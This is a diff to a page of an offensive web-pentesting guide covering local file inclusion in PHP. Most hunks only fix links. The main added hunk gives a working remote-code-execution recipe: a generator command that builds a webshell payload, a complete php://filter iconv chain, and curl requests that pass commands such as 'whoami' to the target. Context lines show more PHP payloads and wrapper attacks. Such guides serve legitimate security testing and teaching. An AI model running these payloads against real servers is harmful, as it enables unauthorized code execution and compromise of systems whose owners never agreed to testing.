@@ -224,7 +224,7 @@ The "[LFI with phpinfo() assistance](https://docs.google.com/viewerng/viewer?url
 #### Image Upload
 
 {% hint style="info" %}
-The prerequisite for this method is to be able to [upload a file](https://app.gitbook.com/@shutdown/s/the-hacker-recipes/\~/drafts/-Mk6VflWDxyIbsU\_ZjzA/web-services/attacks-on-inputs/unrestricted-file-upload).
+The prerequisite for this method is to be able to [upload a file](unrestricted-file-upload.md).
 {% endhint %}
 
 ```bash
@@ -277,9 +277,34 @@ curl --user-agent "PENTEST" -s -X POST --data "<?php system('id'); ?>" "$URL?par
 
 <summary>php://filter</summary>
 
-//TODO : [https://twitter.com/c3l3si4n/status/1560418431878500352](https://twitter.com/c3l3si4n/status/1560418431878500352)
+The `filter` wrapper doesn't require the `allow_include_url` to be set. This works on default PHP configuration `allow_url_include=off`.
+
+{% code overflow="wrap" %}
+```bash
+# Testers should make sure to change the $URL, $FILTERS with the chaining that generates their payload and $FILE with the path to the file they can read.
+curl --user-agent "PENTEST" "$URL?parameter=php://filter/$FILTERS/resource=$FILE"
+```
+The "[php_filter_chain_generator.py](https://github.com/synacktiv/php_filter_chain_generator/blob/main/php_filter_chain_generator.py)" (Python3) implements the generation of the PHP filters chaining.
+
+```bash
+# Example: generate <?=`$_GET[cmd]`;;?> (base64 value: PD89YCRfR0VUW2NtZF1gOzs/Pg) using /etc/passwd file to run whoami command on the target.
+#Generate the payload 
+python3 php_filter_chain_generator.py --chain '<?=`$_GET[cmd]`;;?>'
+#Fill variables
+FILTERS="convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode"
+FILE="/etc/passwd"
+#Get RCE on the target
+curl --user-agent "PENTEST" "$URL?parameter=php://filter/$FILTERS/resource=$FILE&cmd=whoami"
+```
+
+{% hint style="info" %}Finding a valid path to a file on the target is not required. PHP wrappers like `php://temp` can be used instead.{% endhint %}
+
+{% endcode %}
+
+The research article "[PHP filters chain: What is it and how to use it](https://www.synacktiv.com/publications/php-filters-chain-what-is-it-and-how-to-use-it.html)" from Synacktiv and the [original](https://gist.github.com/loknop/b27422) writeup detail the technique.
 
 </details>
+
 
 <details>
 
@@ -297,7 +322,7 @@ curl --user-agent "PENTEST" -s "$URL/?parameter=except://id"
 
 <summary>zip://</summary>
 
-The prerequisite for this method is to be able to [upload a file](https://app.gitbook.com/@shutdown/s/the-hacker-recipes/\~/drafts/-Mk6VflWDxyIbsU\_ZjzA/web-services/attacks-on-inputs/unrestricted-file-upload).
+The prerequisite for this method is to be able to [upload a file](unrestricted-file-upload.md).
 
 {% code overflow="wrap" %}
 ```bash
@@ -315,7 +340,7 @@ curl --user-agent "PENTEST" "$URL/?parameter=zip://payload.zip%23payload.php&cmd
 
 <summary>phar://</summary>
 
-The prerequisite for this method is to be able to [upload a file](https://app.gitbook.com/@shutdown/s/the-hacker-recipes/\~/drafts/-Mk6VflWDxyIbsU\_ZjzA/web-services/attacks-on-inputs/unrestricted-file-upload).
+The prerequisite for this method is to be able to [upload a file](unrestricted-file-upload.md).
 
 ```php
 <?php
